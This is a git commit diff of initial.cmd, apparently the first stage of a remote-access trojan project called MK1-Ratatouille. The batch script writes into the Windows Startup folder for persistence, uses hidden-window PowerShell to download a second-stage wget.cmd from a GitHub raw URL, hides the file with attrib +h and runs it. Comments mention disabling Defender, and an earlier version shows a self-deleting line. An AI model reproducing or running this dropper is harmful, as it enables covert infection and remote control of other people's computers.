486cbac44a5c69abbd1fc1ae6d548c23194eea85
CHEPHYTY <soumyahembra123@gmail.com>
2024-05-20 23:27:41 +0530

    plz work 5

--- initial.cmd
+++ initial.cmd
@@ -6,7 +6,7 @@ REM move into startup directory
 REM variables 
 REM INITIALPATH capture the current path of the dir
 set "INITIALPATH=%cd%" 
-REM STARTUP capture the path of the microsoft startup file
+REM  STARTUP capture the path of the microsoft startup file
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
 REM move into startup directory
@@ -14,16 +14,25 @@ cd /d "%STARTUP%"
 
 REM TODO: Build out stage two
 REM write payloads to startup
-(echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd' -Outfile wget.cmd") > wget.cmd
+@REM https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd
 
-REM hide the wget.cmd file
+@REM (echo powershell -c "Invoke-WebRequest -Uri 'https://videos.pexels.com/video-files/2759477/2759477-uhd_3840_2160_30fps.mp4' -Outfile 'hello.mp4'") > wget.cmd
+@REM Disable defender and execute downloaded script
+powershell -windowstyle hidden -Command ^
+"try { ^
+    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd' -OutFile 'wget.cmd'; ^
+} catch { ^
+    Write-Error 'An error occurred: ' + $_.Exception.Message; ^
+}"
+
+REM hide the stage2.cmd file
 attrib +h wget.cmd
-
-REM run payload
+ 
+REM run payload 
 @REM powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
-powershell -windowstyle hidden -Command "Start-Process powershell.exe 'wget.cmd -WindowStyle Hidden"
+powershell start wget.cmd
 REM cd back into initial location
-cd /d "%INITIALPATH%"
+REM cd /d "%INITIALPATH%"
 
-REM self-delete without error message
-start /b "" cmd /c del "%~f0"&exit
+REM @REM self-delete without error message
+REM start /b "" cmd /c del "%~f0"&exit
